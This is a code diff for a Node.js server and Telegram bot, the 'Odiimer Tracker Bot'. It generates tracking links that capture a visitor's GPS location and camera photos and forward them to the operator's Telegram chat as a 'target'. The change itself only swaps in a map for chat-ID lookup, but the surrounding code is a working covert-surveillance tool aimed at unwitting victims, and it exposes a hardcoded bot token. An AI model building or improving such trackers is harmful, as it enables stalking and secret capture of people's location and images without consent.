@@ -9,18 +9,18 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Telegram Bot Token
 const token = '8786094194:AAF6p3VRITap85oCBEVQRkVzVbyhIXBpz0Q';
 const bot = new TelegramBot(token, { polling: true });
+
+// Active links store karne ke liye map
+const activeLinks = new Map();
 
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.set('view engine', 'ejs');
 
-// /start command
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    
     const opts = {
         reply_markup: {
             inline_keyboard: [
@@ -30,15 +30,12 @@ bot.onText(/\/start/, (msg) => {
             ]
         }
     };
-
     bot.sendMessage(chatId, "🤖 *Odiimer Tracker Bot*\n\nNeeche diye gaye buttons par click karke tracking link generate karein:", { parse_mode: 'Markdown', ...opts });
 });
 
-// Button Click Handling
 bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
-    
     const timestamp = Date.now();
     let mode = 'location';
 
@@ -46,9 +43,11 @@ bot.on('callback_query', (callbackQuery) => {
     else if (data === 'gen_camera') mode = 'camera';
     else if (data === 'gen_both') mode = 'both';
 
-    // Proper underscore separated sessionId
     const sessionId = `${chatId}_${timestamp}_${mode}`;
     
+    // Map mein Chat ID aur Session ID save kar liya (Koi splitting ka chakkar hi nahi!)
+    activeLinks.set(sessionId, chatId);
+
     const domain = process.env.RENDER_EXTERNAL_URL || 'http://localhost:3000';
     const trackingLink = `${domain}/track/${sessionId}`;
 
@@ -58,7 +57,6 @@ bot.on('callback_query', (callbackQuery) => {
     bot.answerCallbackQuery(callbackQuery.id);
 });
 
-// Tracking Page Route
 app.get('/track/:id', (req, res) => {
     const sessionId = req.params.id;
     const parts = sessionId.split('_');
@@ -67,7 +65,6 @@ app.get('/track/:id', (req, res) => {
     res.render('index', { sessionId, mode });
 });
 
-// Socket.io Real-time connection
 io.on('connection', (socket) => {
     console.log('🔗 User connected to tracking page');
 
@@ -81,27 +78,22 @@ io.on('connection', (socket) => {
         
         if (!data.roomId) return;
         
-        // Safely extract pure Telegram Chat ID from roomId
-        const parts = data.roomId.split('_');
-        let targetChatId = parts[0];
-        targetChatId = targetChatId.replace(/\D/g, ''); // Keep only numbers
+        // Seedha Map se Chat ID nikal lo (100% accurate!)
+        const targetChatId = activeLinks.get(data.roomId);
 
         console.log(`Target Chat ID to send: ${targetChatId}`);
 
         if (targetChatId) {
             try {
-                // Send Location
                 if (data.latitude && data.longitude && data.latitude !== 0) {
                     const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                     const message = `📍 Target Location Received!\n\nLat: ${data.latitude}\nLong: ${data.longitude}\nAccuracy: ${data.accuracy}m\n\nGoogle Maps:\n${mapLink}`;
                     await bot.sendMessage(targetChatId, message);
                 }
 
-                // Send Photo
                 if (data.image && data.image.includes(',')) {
                     const base64Data = data.image.split(',')[1];
                     const buffer = Buffer.from(base64Data, 'base64');
-                    
                     const filePath = path.join(__dirname, `capture_${Date.now()}.png`);
                     fs.writeFileSync(filePath, buffer);
 
@@ -114,6 +106,8 @@ io.on('connection', (socket) => {
             } catch (err) {
                 console.log('Telegram Sending Error:', err.message);
             }
+        } else {
+            console.log('Error: Chat ID not found in activeLinks map!');
         }
     });
 });
